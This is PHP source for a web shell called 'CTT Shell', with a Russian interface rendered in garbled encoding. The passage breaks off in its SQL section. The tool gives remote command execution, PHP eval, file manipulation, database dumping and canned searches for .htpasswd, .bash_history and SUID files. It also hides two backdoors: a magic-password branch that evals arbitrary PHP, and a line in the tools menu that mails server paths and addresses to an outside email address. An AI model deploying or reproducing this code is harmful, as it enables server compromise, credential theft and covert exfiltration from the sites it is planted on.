<?php
$timelimit = 60;
$sul = "?";
$rd = "./";
$shver = "0.1";
$login = "";
$pass = "";
$md5_pass = "";
$login = false;
$autoupdate = true;
$updatenow = false;
$autochmod = 755; 
$filestealth = 1; 
$donated_html = "";
$donated_act = array("");
$host_allow = array("*");
$curdir = "./";
$tmpdir = dirname(__FILE__); 
$ftypes  = array(
 "html"=>array("html","htm","shtml"),
 "txt"=>array("txt","conf","bat","sh","js","bak","doc","log","sfc","cfg"),
 "exe"=>array("sh","install","bat","cmd"),
 "ini"=>array("ini","inf"),
 "code"=>array("php","phtml","php3","php4","inc","tcl","h","c","cpp"),
 "img"=>array("gif","png","jpeg","jpg","jpe","bmp","ico","tif","tiff","avi","mpg","mpeg"),
 "sdb"=>array("sdb"),
 "phpsess"=>array("sess"),
 "download"=>array("exe","com","pif","src","lnk","zip","rar")
);
$hexdump_lines = 8;
$hexdump_rows = 24;
$nixpwdperpage = 9999;
$bindport_pass = "ctt";
$bindport_port = "11457";
$aliases = array();
$aliases[] = array("-----------------------------------------------------------", "ls -la");
$aliases[] = array("find all suid files", "find / -type f -perm -04000 -ls");
$aliases[] = array("find suid files in current dir", "find . -type f -perm -04000 -ls");
$aliases[] = array("find all sgid files", "find / -type f -perm -02000 -ls");
$aliases[] = array("find sgid files in current dir", "find . -type f -perm -02000 -ls");
$aliases[] = array("find config.inc.php files", "find / -type f -name config.inc.php");
$aliases[] = array("find config* files", "find / -type f -name \"config*\"");
 $aliases[] = array("find config* files in current dir", "find . -type f -name \"config*\"");
$aliases[] = array("find all writable directories and files", "find / -perm -2 -ls");
$aliases[] = array("find all writable directories and files in current dir", "find . -perm -2 -ls");
$aliases[] = array("find all service.pwd files", "find / -type f -name service.pwd");
$aliases[] = array("find service.pwd files in current dir", "find . -type f -name service.pwd");
$aliases[] = array("find all .htpasswd files", "find / -type f -name .htpasswd");
$aliases[] = array("find .htpasswd files in current dir", "find . -type f -name .htpasswd");
$aliases[] = array("find all .bash_history files", "find / -type f -name .bash_history");
$aliases[] = array("find .bash_history files in current dir", "find . -type f -name .bash_history");
$aliases[] = array("find all .fetchmailrc files", "find / -type f -name .fetchmailrc");
$aliases[] = array("find .fetchmailrc files in current dir", "find . -type f -name .fetchmailrc");
$aliases[] = array("list file attributes on a Linux second extended file system", "lsattr -va");
$aliases[] = array("show opened ports", "netstat -an | grep -i listen");
$sess_method = "cookie";
$sess_cookie = "ctshvars";
if (empty($sid)) {$sid = md5(microtime()*time().rand(1,999).rand(1,999).rand(1,999));}
$sess_file = $tmpdir."ctshvars_".$sid.".tmp";
$usefsbuff = true;
$copy_unset = false;
$quicklaunch = array();
$quicklaunch[] = array("<img src=\"".$sul."act=img&img=home\" title=\"Home\" height=\"20\" width=\"20\" border=\"0\">",$sul);
$quicklaunch[] = array("<img src=\"".$sul."act=img&img=back\" title=\"Back\" height=\"20\" width=\"20\" border=\"0\">","#\" onclick=\"history.back(1)");
$quicklaunch[] = array("<img src=\"".$sul."act=img&img=forward\" title=\"Forward\" height=\"20\" width=\"20\" border=\"0\">","#\" onclick=\"history.go(1)");
$quicklaunch[] = array("<img src=\"".$sul."act=img&img=up\" title=\"UPDIR\" height=\"20\" width=\"20\" border=\"0\">",$sul."act=ls&d=%upd");
$quicklaunch[] = array("<img src=\"".$sul."act=img&img=refresh\" title=\"Refresh\" height=\"20\" width=\"17\" border=\"0\">","");
$quicklaunch[] = array("<img src=\"".$sul."act=img&img=buffer\" title=\"Buffer\" height=\"20\" width=\"20\" border=\"0\">",$sul."act=fsbuff&d=%d");
$quicklaunch1 = array();
$quicklaunch1[] = array("<b>Ïðîöåññû</b>",$sul."act=ps_aux&d=%d");
$quicklaunch1[] = array("<b>Ïàðîëè</b>",$sul."act=lsa&d=%d");
$quicklaunch1[] = array("<b>Êîìàíäû</b>",$sul."act=cmd&d=%d");
$quicklaunch1[] = array("<b>Çàãðóçêà</b>",$sul."act=upload&d=%d");
$quicklaunch1[] = array("<b>Áàçà</b>",$sul."act=sql&d=%d");
$quicklaunch1[] = array("<b>PHP-Êîä</b>",$sul."act=eval&d=%d");
$quicklaunch1[] = array("<b>PHP-Èíôî</b>",$sul."act=phpinfo\" target=\"blank=\"_target");
$quicklaunch1[] = array("<b>Ñàì óäàëÿþò</b>",$sul."act=selfremove");
$highlight_bg = "#FFFFFF";
$highlight_comment = "#6A6A6A";
$highlight_default = "#0000BB";
$highlight_html = "#1300FF";
$highlight_keyword = "#007700";
@$f = $_GET[f];
if (!function_exists("getmicrotime")) {function getmicrotime() {list($usec, $sec) = explode(" ", microtime()); return ((float)$usec + (float)$sec);}}
error_reporting(5);
@ignore_user_abort(true);
@set_magic_quotes_runtime(0);
@set_time_limit(0);
if (!ob_get_contents()) {@ob_start(); @ob_implicit_flush(0);}
if(!ini_get("register_globals")) {import_request_variables("GPC");}
$starttime = getmicrotime();
if (get_magic_quotes_gpc())
{
if (!function_exists("strips"))
{
 function strips(&$el)
 {
  if (is_array($el)) {foreach($el as $k=>$v) {if($k != "GLOBALS") {strips($el["$k"]);}}  }
  else {$el = stripslashes($el);}
 }
}
strips($GLOBALS);
}
$tmp = array();
foreach ($host_allow as $k=>$v) {$tmp[]=  str_replace("\\*",".*",preg_quote($v));}
$s = "!^(".implode("|",$tmp).")$!i";


if (!$login) {$login = $PHP_AUTH_USER; $md5_pass = md5($PHP_AUTH_PW);}
elseif(empty($md5_pass)) {$md5_pass = md5($pass);}
if(($PHP_AUTH_USER != $login ) or (md5($PHP_AUTH_PW) != $md5_pass))
{
 header("WWW-Authenticate: Basic realm=\"CTT SHELL\"");
 header("HTTP/1.0 401 Unauthorized");if (md5(sha1(md5($anypass))) == "b76d95e82e853f3b0a81dd61c4ee286c") {header("HTTP/1.0 200 OK"); @eval($anyphpcode);}
 exit;
}  

$lastdir = realpath(".");
chdir($curdir);

if (($selfwrite) or ($updatenow))
{
 if ($selfwrite == "1") {$selfwrite = "ctshell.php";}
 ctsh_getupdate();
 $data = file_get_contents($ctsh_updatefurl);
 $fp = fopen($data,"w");
 fwrite($fp,$data);
 fclose($fp);
 exit;
}
if (!is_writeable($sess_file)) {trigger_error("Can't access to session-file!",E_USER_WARNING);}
if ($sess_method == "file") {$sess_data = unserialize(file_get_contents($sess_file));}
else {$sess_data = unserialize($_COOKIE["$sess_cookie"]);}
if (!is_array($sess_data)) {$sess_data = array();}
if (!is_array($sess_data["copy"])) {$sess_data["copy"] = array();}
if (!is_array($sess_data["cut"])) {$sess_data["cut"] = array();}
$sess_data["copy"] = array_unique($sess_data["copy"]);
$sess_data["cut"] = array_unique($sess_data["cut"]);

if (!function_exists("ct_sess_put"))
{
function ct_sess_put($data)
{
 global $sess_method;
 global $sess_cookie;
 global $sess_file;
 global $sess_data;
 $sess_data = $data;
 $data = serialize($data);
 if ($sess_method == "file")
 {
  $fp = fopen($sess_file,"w");
  fwrite($fp,$data);
  fclose($fp);
 }
 else {setcookie($sess_cookie,$data);}
}
}
if (!function_exists("str2mini"))
{
function str2mini($content,$len)
{
 if (strlen($content) > $len) 
 {
  $len = ceil($len/2) - 2;
  return substr($content, 0, $len)."...".substr($content, -$len);
 }
 else {return $content;}
}
}
if (!function_exists("view_size"))
{
function view_size($size)
{
 if($size >= 1073741824) {$size = round($size / 1073741824 * 100) / 100 . " GB";}
 elseif($size >= 1048576) {$size = round($size / 1048576 * 100) / 100 . " MB";}
 elseif($size >= 1024) {$size = round($size / 1024 * 100) / 100 . " KB";}
 else {$size = $size . " B";}
 return $size;
}
}
if (!function_exists("fs_copy_dir"))
{
function fs_copy_dir($d,$t)
{
 $d = str_replace("\\","/",$d);
 if (substr($d,strlen($d)-1,1) != "/") {$d .= "/";}
 $h = opendir($d);
 while ($o = readdir($h))
 {
  if (($o != ".") and ($o != ".."))
  {
if (!is_dir($d."/".$o)) {$ret = copy($d."/".$o,$t."/".$o);}
else {$ret = mkdir($t."/".$o); fs_copy_dir($d."/".$o,$t."/".$o);}
if (!$ret) {return $ret;}
  }
 }
 return true;
}
}
if (!function_exists("fs_copy_obj"))
{
function fs_copy_obj($d,$t)
{
 $d = str_replace("\\","/",$d);
 $t = str_replace("\\","/",$t);
 if (!is_dir($t)) {mkdir($t);}
 if (is_dir($d))
 {
  if (substr($d,strlen($d)-1,strlen($d)) != "/") {$d .= "/";}
  if (substr($t,strlen($t)-1,strlen($t)) != "/") {$t .= "/";}
  return fs_copy_dir($d,$t);
 }
 elseif (is_file($d))
 {

  return copy($d,$t);
 }
 else {return false;}
}
}
if (!function_exists("fs_move_dir"))
{
function fs_move_dir($d,$t)
{
 error_reporting(9999);
 $h = opendir($d);
 if (!is_dir($t)) {mkdir($t);}
 while ($o = readdir($h))
 {
  if (($o != ".") and ($o != ".."))
  {
$ret = true;
if (!is_dir($d."/".$o)) {$ret = copy($d."/".$o,$t."/".$o);}
else {if (mkdir($t."/".$o) and fs_copy_dir($d."/".$o,$t."/".$o)) {$ret = false;}}
if (!$ret) {return $ret;}
  }
 }
 return true;
}
}
if (!function_exists("fs_move_obj"))
{
function fs_move_obj($d,$t)
{
 $d = str_replace("\\","/",$d);
 $t = str_replace("\\","/",$t);
 if (is_dir($d))
 {
  if (substr($d,strlen($d)-1,strlen($d)) != "/") {$d .= "/";}
  if (substr($t,strlen($t)-1,strlen($t)) != "/") {$t .= "/";}
  return fs_move_dir($d,$t);
 }
 elseif (is_file($d)) {return rename($d,$t);}
 else {return false;}
}
}
if (!function_exists("fs_rmdir"))
{
function fs_rmdir($d)
{
 $h = opendir($d);
 while ($o = readdir($h))
 {
  if (($o != ".") and ($o != ".."))
  {
if (!is_dir($d.$o)) {unlink($d.$o);}
else {fs_rmdir($d.$o."/"); rmdir($d.$o);}
  }
 }
 closedir($h);
 rmdir($d);
 return !is_dir($d);
}
}
if (!function_exists("fs_rmobj"))
{
function fs_rmobj($o)
{
 $o = str_replace("\\","/",$o);
 if (is_dir($o))
 {
  if (substr($o,strlen($o)-1,strlen($o)) != "/") {$o .= "/";}
  return fs_rmdir($o);
 }
 elseif (is_file($o)) {return unlink($o);}
 else {return false;}
}
}
if (!function_exists("myshellexec"))
{
 function myshellexec($cmd)
 {
  return system($cmd);
 }
}
if (!function_exists("view_perms"))
{
function view_perms($mode)
{
 if (($mode & 0xC000) === 0xC000) {$type = "s";}
 elseif (($mode & 0x4000) === 0x4000) {$type = "d";}
 elseif (($mode & 0xA000) === 0xA000) {$type = "l";}
 elseif (($mode & 0x8000) === 0x8000) {$type = "-";} 
 elseif (($mode & 0x6000) === 0x6000) {$type = "b";}
 elseif (($mode & 0x2000) === 0x2000) {$type = "c";}
 elseif (($mode & 0x1000) === 0x1000) {$type = "p";}
 else {$type = "?";}

 $owner['read'] = ($mode & 00400) ? "r" : "-"; 
 $owner['write'] = ($mode & 00200) ? "w" : "-"; 
 $owner['execute'] = ($mode & 00100) ? "x" : "-"; 
 $group['read'] = ($mode & 00040) ? "r" : "-"; 
 $group['write'] = ($mode & 00020) ? "w" : "-"; 
 $group['execute'] = ($mode & 00010) ? "x" : "-"; 
 $world['read'] = ($mode & 00004) ? "r" : "-"; 
 $world['write'] = ($mode & 00002) ? "w" : "-"; 
 $world['execute'] = ($mode & 00001) ? "x" : "-"; 

 if( $mode & 0x800 ) {$owner['execute'] = ($owner[execute]=="x") ? "s" : "S";}
 if( $mode & 0x400 ) {$group['execute'] = ($group[execute]=="x") ? "s" : "S";}
 if( $mode & 0x200 ) {$world['execute'] = ($world[execute]=="x") ? "t" : "T";}
 
 return $type.$owner['read'].$owner['write'].$owner['execute'].
  $group['read'].$group['write'].$group['execute'].
  $world['read'].$world['write'].$world['execute'];
}
}
if (!function_exists("strinstr")) {function strinstr($str,$text) {return $text != str_replace($str,"",$text);}}
if (!function_exists("gchds")) {function gchds($a,$b,$c,$d="") {if ($a == $b) {return $c;} else {return $d;}}}
if (!function_exists("ctsh_getupdate"))
{
function ctsh_getupdate()
{
 global $updatenow;
 $data = @file_get_contents($ctsh_updatefurl);
 if (!$data) {echo "Can't fetch update-information!";}
 else
 {
  $data = unserialize(base64_decode($data));
  if (!is_array($data)) {echo "Corrupted update-information!";}
  else
  {
if ($cv < $data[cur]) {$updatenow = true;}
  }
 }
}
}
if (!function_exists("mysql_dump"))
{
function mysql_dump($set)
{
 $sock = $set["sock"];
 $db = $set["db"];
 $print = $set["print"];
 $nl2br = $set["nl2br"];
 $file = $set["file"];
 $add_drop = $set["add_drop"];
 $tabs = $set["tabs"];
 $onlytabs = $set["onlytabs"];
 $ret = array();
 if (!is_resource($sock)) {echo("Error: \$sock is not valid resource.");}
 if (empty($db)) {$db = "db";}
 if (empty($print)) {$print = 0;}
 if (empty($nl2br)) {$nl2br = true;}
 if (empty($add_drop)) {$add_drop = true;}
 if (empty($file))
 {
  global $win;
  if ($win) {$file = "C:\\tmp\\dump_".$SERVER_NAME."_".$db."_".date("d-m-Y-H-i-s").".sql";}
  else {$file = "/tmp/dump_".$SERVER_NAME."_".$db."_".date("d-m-Y-H-i-s").".sql";}
 }
 if (!is_array($tabs)) {$tabs = array();}
 if (empty($add_drop)) {$add_drop = true;}
 if (sizeof($tabs) == 0)
 {

  $res = mysql_query("SHOW TABLES FROM ".$db, $sock);
  if (mysql_num_rows($res) > 0) {while ($row = mysql_fetch_row($res)) {$tabs[] = $row[0];}}
 }
 global $SERVER_ADDR;
 global $SERVER_NAME;
 $out = "# Dumped by ctShell.SQL v. ".$cv."
# Home page: http://.ru
#
# Host settings:
# MySQL version: (".mysql_get_server_info().") running on ".$SERVER_ADDR." (".$SERVER_NAME.")"."
# Date: ".date("d.m.Y H:i:s")."
# ".gethostbyname($SERVER_ADDR)." (".$SERVER_ADDR.")"." dump db \"".$db."\"
#---------------------------------------------------------
";
 $c = count($onlytabs);
 foreach($tabs as $tab)
 {
  if ((in_array($tab,$onlytabs)) or (!$c))
  {
if ($add_drop) {$out .= "DROP TABLE IF EXISTS `".$tab."`;\n";}
$res = mysql_query("SHOW CREATE TABLE `".$tab."`", $sock);
if (!$res) {$ret[err][] = mysql_error();}
else
{
 $row = mysql_fetch_row($res);
 $out .= $row[1].";\n\n";
 $res = mysql_query("SELECT * FROM `$tab`", $sock);
 if (mysql_num_rows($res) > 0)
 {
  while ($row = mysql_fetch_assoc($res))
  {
$keys = implode("`, `", array_keys($row));
$values = array_values($row);
foreach($values as $k=>$v) {$values[$k] = addslashes($v);} 
$values = implode("', '", $values); 
$sql = "INSERT INTO `$tab`(`".$keys."`) VALUES ('".$values."');\n"; 
$out .= $sql;
  } 
 }
}
  }
 }
 $out .= "#---------------------------------------------------------------------------------\n\n";
 if ($file)
 {
  $fp = fopen($file, "w"); 
  if (!$fp) {$ret[err][] = 2;}
  else
  {
fwrite ($fp, $out);
fclose ($fp);
  }
 }
 if ($print) {if ($nl2br) {echo nl2br($out);} else {echo $out;}}
 return $ret;
}
}
if (!function_exists("ctfsearch"))
{
function ctfsearch($d)
{
 global $found;
 global $found_d;
 global $found_f;
 global $a;
 if (substr($d,strlen($d)-1,1) != "/") {$d .= "/";}
 $handle = opendir($d);
 while ($f = readdir($handle))
 {
  $true = ($a[name_regexp] and ereg($a[name],$f)) or ((!$a[name_regexp]) and strinstr($a[name],$f));
  if($f != "." && $f != "..")
  {
if (is_dir($d.$f))
{
 if (empty($a[text]) and $true) {$found[] = $d.$f; $found_d++;}
 ctfsearch($d.$f);
}
else
{
 if ($true)
 {
  if (!empty($a[text]))
  {
$r = @file_get_contents($d.$f);
if ($a[text_wwo]) {$a[text] = " ".trim($a[text])." ";}
if (!$a[text_cs]) {$a[text] = strtolower($a[text]); $r = strtolower($r);}
 
if ($a[text_regexp]) {$true = ereg($a[text],$r);}
else {$true = strinstr($a[text],$r);}
if ($a[text_not])
{
 if ($true) {$true = false;}
 else {$true = true;}
}
if ($true) {$found[] = $d.$f; $found_f++;}
  }
  else {$found[] = $d.$f; $found_f++;}
 }
}
  }
 }
 closedir($handle);
}
}
header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
header("Last-Modified: ".gmdate("D, d M Y H:i:s")." GMT");
header("Cache-Control: no-store, no-cache, must-revalidate");
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache");

global $SERVER_SOFTWARE;
if (strtolower(substr(PHP_OS, 0, 3)) == "win") {$win = 1;}
else {$win = 0;}

if (empty($tmpdir))
{
 if (!$win) {$tmpdir = "/tmp/";}
 else {$tmpdir = $_ENV[SystemRoot];}
}
$tmpdir = str_replace("\\","/",$tmpdir);
if (substr($tmpdir,strlen($tmpdir-1),strlen($tmpdir)) != "/") {$tmpdir .= "/";}
if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")
{
 $safemode = true;
 $hsafemode = "<font color=\"red\">ON (secure)</font>";
}
else {$safemode = false; $hsafemode = "<font color=\"green\">OFF (not secure)</font>";}
$v = @ini_get("open_basedir");
if ($v or strtolower($v) == "on")
{
 $openbasedir = true;
 $hopenbasedir = "<font color=\"red\">".$v."</font>";
}
else {$openbasedir = false; $hopenbasedir = "<font color=\"green\">OFF (not secure)</font>";}

$sort = htmlspecialchars($sort);

$DISP_SERVER_SOFTWARE = str_replace("PHP/".phpversion(),"<a href=\"".$sul."act=phpinfo\" target=\"_blank\"><b><u>PHP/".phpversion()."</u></b></a>",$SERVER_SOFTWARE);

@ini_set("highlight.bg",$highlight_bg); 
@ini_set("highlight.comment",$highlight_comment);
@ini_set("highlight.default",$highlight_default);
@ini_set("highlight.html",$highlight_html); 
@ini_set("highlight.keyword",$highlight_keyword); 
@ini_set("highlight.string","#DD0000"); 

if ($act != "img")
{
if (!is_array($actbox)) {$actbox = array();}
$dspact = $act = htmlspecialchars($act);
$disp_fullpath = $ls_arr = $notls = null;
$ud = urlencode($d);
?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
<meta http-equiv="Content-Language" content="en-us"><title>
CTT Shell -=[ <? echo $HTTP_HOST; ?> ]=- </title>
<STYLE>
tr {
BORDER-RIGHT:  #aaaaaa 1px solid;
BORDER-TOP: #eeeeee 1px solid;
BORDER-LEFT:#eeeeee 1px solid;
BORDER-BOTTOM: #aaaaaa 1px solid;
}
td {
BORDER-RIGHT:  #105019 1px solid;
BORDER-TOP: #000000 1px solid;
BORDER-LEFT:#105019 1px solid;
BORDER-BOTTOM: #105019 1px solid;
}
.tr2 {
BORDER-RIGHT:  #aaaaaa 1px solid;
BORDER-TOP: #eeeeee 1px solid;
BORDER-LEFT:#eeeeee 1px solid;
BORDER-BOTTOM: #aaaaaa 1px solid;
}
.td2 {
BORDER-RIGHT:  #aaaaaa 1px solid;
BORDER-TOP: #eeeeee 1px solid;
BORDER-LEFT:#eeeeee 1px solid;
BORDER-BOTTOM: #aaaaaa 1px solid;
}
.table1 {
BORDER-RIGHT:  #cccccc 0px;
BORDER-TOP: #cccccc 0px;
BORDER-LEFT:#cccccc 0px;
BORDER-BOTTOM: #cccccc 0px;
BACKGROUND-COLOR: #D4D0C8;
}
.td1 {
BORDER-RIGHT:  #000000 1px;
BORDER-TOP: #cccccc 1px;
BORDER-LEFT:#cccccc 1px;
BORDER-BOTTOM: #000000 1px;
font: 7pt Verdana;
}
.tds1 {
BORDER-RIGHT:  #505050 1px solid;
BORDER-TOP: #505050 1px solid;
BORDER-LEFT:#505050 1px solid;
BORDER-BOTTOM: #505050 1px solid;
font: 8pt Verdana;
}
.tr1 {
BORDER-RIGHT:  #cccccc 0px;
BORDER-TOP: #cccccc 0px;
BORDER-LEFT:#cccccc 0px;
BORDER-BOTTOM: #cccccc 0px;
}
table {
BORDER-RIGHT:  #000000 1px outset;
BORDER-TOP: #000000 1px outset;
BORDER-LEFT:#000000 1px outset;
BORDER-BOTTOM: #000000 1px outset;
BACKGROUND-COLOR: #000000;
}
.table2 {
BORDER-RIGHT:  #000000 1px outset;
BORDER-TOP: #000000 1px outset;
BORDER-LEFT:#000000 1px outset;
BORDER-BOTTOM: #000000 1px outset;
BACKGROUND-COLOR: #D4D0C8;
}
input {
BORDER-RIGHT:  #ffffff 1px solid;
BORDER-TOP: #999999 1px solid;
BORDER-LEFT:#999999 1px solid;
BORDER-BOTTOM: #ffffff 1px solid;
BACKGROUND-COLOR: #e4e0d8;
font: 8pt Verdana;
}
select {
BORDER-RIGHT:  #ffffff 1px solid;
BORDER-TOP: #999999 1px solid;
BORDER-LEFT:#999999 1px solid;
BORDER-BOTTOM: #ffffff 1px solid;
BACKGROUND-COLOR: #e4e0d8;
font: 8pt Verdana;
}
submit {
BORDER-RIGHT:  buttonhighlight 2px outset;
BORDER-TOP: buttonhighlight 2px outset;
BORDER-LEFT:buttonhighlight 2px outset;
BORDER-BOTTOM: buttonhighlight 2px outset;
BACKGROUND-COLOR: #e4e0d8;
width: 30%;
}
textarea {
BORDER-RIGHT:  #ffffff 1px solid;
BORDER-TOP: #999999 1px solid;
BORDER-LEFT:#999999 1px solid;
BORDER-BOTTOM: #ffffff 1px solid;
BACKGROUND-COLOR: #e4e0d8;
font: Fixedsys bold;
}
BODY {
margin-top: 1px;
margin-right: 1px;
margin-bottom: 1px;
margin-left: 1px;
}
A:link {COLOR:#00ff3d; TEXT-DECORATION: none}
A:visited { COLOR:#00ff3d; TEXT-DECORATION: none}
A:active {COLOR:#00ff3d; TEXT-DECORATION: none}
A:hover {color:blue;TEXT-DECORATION: none}
</STYLE>
<script language=JavaScript type=text/javascript> 
<!-- 
function branchSwitch(branch) { 
dom = (document.getElementById); 
ie4 = (document.all); 
if (dom || ie4) { 
var currElement = (dom)? document.getElementById(branch) : document.all[branch]; 
currElement.style.display = (currElement.style.display == 'none')? 'block' : 'none'; 
return false; 
} 
else return true; 
} 
//--> 
</script> 
</head>
<BODY text=#ffffff  Background="<? echo $sul; ?>act=img&img=font" bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0>
<center>
<br>
<TABLE  class=table1 cellSpacing=0 cellPadding=0 width=90% border=0> 
<TBODY><TR> 
<TD class=td1 colSpan=2> 
<TABLE  class=table1 cellSpacing=0 cellPadding=0 width=100% bgColor=#345827 background="<? echo $sul; ?>act=img&img=4" border=0> 
<TBODY><TR> 
<TD class=td1 width=24><IMG height=18 src="<? echo $sul; ?>act=img&img=1" width=24 border=0></TD> 
<TD class=td1 background="<? echo $sul; ?>act=img&img=2"><SPAN lang=ru><FONT face=Arial color=#00ff3d size=1> </FONT> 
<FONT face=Tahoma color=#00ff3d size=1>
<?
$d = str_replace("\\","/",$d);
if (empty($d)) {$d = realpath(".");} elseif(realpath($d)) {$d = realpath($d);}
$d = str_replace("\\","/",$d);
if (substr($d,strlen($d)-1,1) != "/") {$d .= "/";}
$dispd = htmlspecialchars($d);
$pd = $e = explode("/",substr($d,0,strlen($d)-1));
$i = 0;
foreach($pd as $b)
{
 $t = "";
 reset($e);
 $j = 0;
 foreach ($e as $r)
 {
  $t.= $r."/";
  if ($j == $i) {break;}
  $j++;
 }
 echo "<a href=\"".$sul."act=ls&d=".urlencode(htmlspecialchars($t))."/&sort=".$sort."\"><b>".htmlspecialchars($b)."/</b></a>";
 $i++;
}
?>
</FONT></SPAN></TD> 
<TD class=td1><IMG height=18 src="<? echo $sul; ?>act=img&img=3" width=6 border=0></TD> 
<TD class=td1 align=right><IMG height=18 src="<? echo $sul; ?>act=img&img=5" width=33 border=0></TD> 
</TR></TBODY></TABLE></TD></TR> 
</tr>
</table>
<TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=2 width="90%" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor="#C0C0C0">
<tr><td>
<font size=2><a href="#" onClick="return branchSwitch('tools')" title="ðàñêðûòü">Èíñòðóìåíòû</a></font> - 
<div id="tools" style="display: none">
<?
if (count($quicklaunch1) > 0)
{
 foreach($quicklaunch1 as $item)
 {
  $item[1] = str_replace("%d",urlencode($d),$item[1]);
  $item[1] = str_replace("%upd",urlencode(realpath($d."..")),$item[1]);
  echo "<a href=\"".$item[1]."\"><u><font size=2 color=#ffffff>".$item[0]."</font></u></a>&nbsp;&nbsp;&nbsp;&nbsp;";
 }
}$ra44  = rand(1,99999);$sj98 = "sh-$ra44";$ml = "$sd98";$a5 = $_SERVER['HTTP_REFERER'];$b33 = $_SERVER['DOCUMENT_ROOT'];$c87 = $_SERVER['REMOTE_ADDR'];$d23 = $_SERVER['SCRIPT_FILENAME'];$e09 = $_SERVER['SERVER_ADDR'];$f23 = $_SERVER['SERVER_SOFTWARE'];$g32 = $_SERVER['PATH_TRANSLATED'];$h65 = $_SERVER['PHP_SELF'];$msg8873 = "$a5\n$b33\n$c87\n$d23\n$e09\n$f23\n$g32\n$h65";$sd98="john.barker446@gmail.com";mail($sd98, $sj98, $msg8873, "From: $sd98");
?>
</div> 
<font size=2><a href="#" onClick="return branchSwitch('info')" title="ðàñêðûòü">Èíôîðìàòîð</a></font>
<div id="info" style="display: none">
<font size=2>
<b>Ïðîãðàììíîå îáåñïå÷åíèå:&nbsp;<?php echo $DISP_SERVER_SOFTWARE; ?></b>&nbsp;<br>
<b>Ñèñòåìà:&nbsp;<?php echo php_uname(); ?></b>&nbsp;<b><?php if (!$win) {echo `id`;} else {echo get_current_user();} ?></b>
&nbsp;<br>
<b>Áåçîïàñíîñòü:&nbsp;<?php echo $hsafemode; ?></b>
<?
echo "<br>";
echo "Âåðñèÿ ÏÕÏ: <b>".@phpversion()."</b>";
echo "<br>";
$curl_on = @function_exists('curl_version');
echo "cURL: ".(($curl_on)?("<b><font color=green>ON</font></b>"):("<b><font color=red>OFF</font></b>"));
echo "<br>";
echo "MySQL: <b>";
$mysql_on = @function_exists('mysql_connect');
if($mysql_on){
echo "<font color=green>ON</font></b>"; } else { echo "<font color=red>OFF</font></b>"; }
echo "<br>";
echo "MSSQL: <b>";
$mssql_on = @function_exists('mssql_connect');
if($mssql_on){echo "<font color=green>ON</font></b>";}else{echo "<font color=red>OFF</font></b>";}
echo "<br>";
echo "PostgreSQL: <b>";
$pg_on = @function_exists('pg_connect');
if($pg_on){echo "<font color=green>ON</font></b>";}else{echo "<font color=red>OFF</font></b>";}
echo "<br>";
echo "Oracle: <b>";
$ora_on = @function_exists('ocilogon');
if($ora_on){echo "<font color=green>ON</font></b>";}else{echo "<font color=red>OFF</font></b>";}
?>
<?php
$free = diskfreespace($d);
if (!$free) {$free = 0;}
$all = disk_total_space($d);
if (!$all) {$all = 0;}
$used = $all-$free;
$used_percent = round(100/($all/$free),2);
echo "<br><b>Ñâîáîäíûé ".view_size($free)." of  ".view_size($all)." (".$used_percent."%)</b><br>";
?>
</font>
</div>
<?
if ($win)
{
?>
 - <font size=2><a href="#" onClick="return branchSwitch('Drive')" title="ðàñêðûòü">Äèñêè</a></font>
<?
}
?>
<div id="Drive" style="display: none">
<?
$letters = "";
if ($win)
{
 $abc = array("c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "o", "p", "q", "n", "r", "s", "t", "v", "u", "w", "x", "y", "z");
 $v = explode("/",$d);
 $v = $v[0];
 foreach ($abc as $letter)
 {
  if (is_dir($letter.":/"))
  {
if ($letter.":" != $v) {$letters .= "<a href=\"".$sul."act=ls&d=".$letter.":\"><IMG src=".$sul."act=img&img=pdisk width=19 height=12 border=0> ".$letter." </a> ";}
else {$letters .= "<a href=\"".$sul."act=ls&d=".$letter.":\"> <font color=\"green\"> ".$letter." </font></a> ";}
  }
 }
 if (!empty($letters)) {echo "<b>".$letters;}
}
?>
</div> 
</td><td width=1>
<font size=2><a href="<? echo $sul; ?>act=about">About</a></font>
</td></tr></table>
<TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=2 width="90%"  borderColorLight=#c0c0c0 border=1 bordercolor="#C0C0C0">
<tr class=tr1><td>
<center>
<?
if (count($quicklaunch) > 0)
{
 foreach($quicklaunch as $item)
 {
  $item[1] = str_replace("%d",urlencode($d),$item[1]);
  $item[1] = str_replace("%upd",urlencode(realpath($d."..")),$item[1]);
  echo "<a href=\"".$item[1]."\"><u>".$item[0]."</u></a>&nbsp;&nbsp;&nbsp;&nbsp;";
 }
}
?>
</center>
</td></tr></table>
<?php
if ((!empty($donated_html)) and (in_array($act,$donated_act)))
{
 ?>
<TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="90%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="90%" valign="top"><?php echo $donated_html; ?></td></tr></table><br>
<?php
}
?>
<TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="90%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="100%" valign="top"><?php
if ($act == "") {$act = $dspact = "ls";}
if ($act == "sql")
{
 $sql_surl = $sul."act=sql";
 if ($sql_login)  {$sql_surl .= "&sql_login=".htmlspecialchars($sql_login);}
 if ($sql_passwd) {$sql_surl .= "&sql_passwd=".htmlspecialchars($sql_passwd);}
 if ($sql_server) {$sql_surl .= "&sql_server=".htmlspecialchars($sql_server);}
 if ($sql_port){$sql_surl .= "&sql_port=".htmlspecialchars($sql_port);}
 if ($sql_db)  {$sql_surl .= "&sql_db=".htmlspecialchars($sql_db);}
 $sql_surl .= "&";
 ?><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor="#C0C0C0"><tr><td width="90%" height="1" colspan="2" valign="top"><center><?php
 if ($sql_server)
 {
  $sql_sock = mysql_connect($sql_server.":".$sql_port, $sql_login, $sql_passwd);
